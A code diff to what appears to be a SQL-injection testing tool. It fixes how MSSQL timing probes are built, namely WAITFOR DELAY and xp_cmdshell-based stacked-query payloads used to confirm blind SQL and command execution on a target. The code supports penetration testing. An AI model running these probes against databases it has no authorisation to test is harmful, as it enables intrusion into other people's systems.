@@ -356,7 +356,10 @@ class ExecProbe:
     note: str
 
     def build_sql(self, secs: int) -> str:
-        return self.sql_template.format(secs=secs, secs1=secs + 1)
+        # {hms} is a valid HH:MM:SS literal for WAITFOR DELAY: '00:00:60' is
+        # invalid, so seconds must carry into minutes/hours for delays >= 60.
+        hms = f"{secs // 3600:02d}:{(secs % 3600) // 60:02d}:{secs % 60:02d}"
+        return self.sql_template.format(secs=secs, secs1=secs + 1, hms=hms)
 
 
 # Each template sleeps for `secs` seconds when it executes. secs1 == secs+1 is
@@ -364,7 +367,7 @@ class ExecProbe:
 MSSQL_EXEC_PROBES: List[ExecProbe] = [
     ExecProbe(
         "waitfor", "WAITFOR DELAY (stacked-query timing control)", "any", False,
-        "WAITFOR DELAY '00:00:{secs:02d}'",
+        "WAITFOR DELAY '{hms}'",
         "A delay proves stacked-query execution and that the timing channel "
         "works -- but NOT OS command execution."),
     ExecProbe(
@@ -500,7 +503,9 @@ def verify_execution(
         threshold = baseline + delay * confirm_fraction
 
         # -- delayed trials --------------------------------------------------
-        d = int(round(delay))
+        # Round to whole seconds for the sleep primitives, but never below 1s or
+        # a sub-second delay collapses the trial into the zero-delay baseline.
+        d = max(1, int(round(delay)))
         d_value = payload_template.format(sql=probe.build_sql(d))
         primary: List[ExecTrial] = []
         for _ in range(max(trials, 1)):
@@ -613,12 +618,18 @@ def resolve_exec_probes(names: Optional[List[str]] = None,
             raise ValueError("--exec-sql must contain the {secs} placeholder")
         return [ExecProbe("custom", "custom execution probe", "any", True,
                           custom_sql, "Custom operator-supplied delay statement.")]
-    if not names or names == ["auto"]:
-        return [EXEC_PROBES_BY_KEY["waitfor"],
-                EXEC_PROBES_BY_KEY["xp_cmdshell_nix"],
-                EXEC_PROBES_BY_KEY["xp_cmdshell_win"]]
-    out: List[ExecProbe] = []
+    auto = ["waitfor", "xp_cmdshell_nix", "xp_cmdshell_win"]
+    if not names:
+        names = ["auto"]
+    # "auto" may appear alongside explicit names (--probe is repeatable); expand
+    # it in place and de-duplicate rather than rejecting the combination.
+    expanded: List[str] = []
     for n in names:
+        for key in (auto if n == "auto" else [n]):
+            if key not in expanded:
+                expanded.append(key)
+    out: List[ExecProbe] = []
+    for n in expanded:
         if n not in EXEC_PROBES_BY_KEY:
             raise ValueError(f"unknown exec probe {n!r}; choose from "
                              + ", ".join(EXEC_PROBES_BY_KEY))
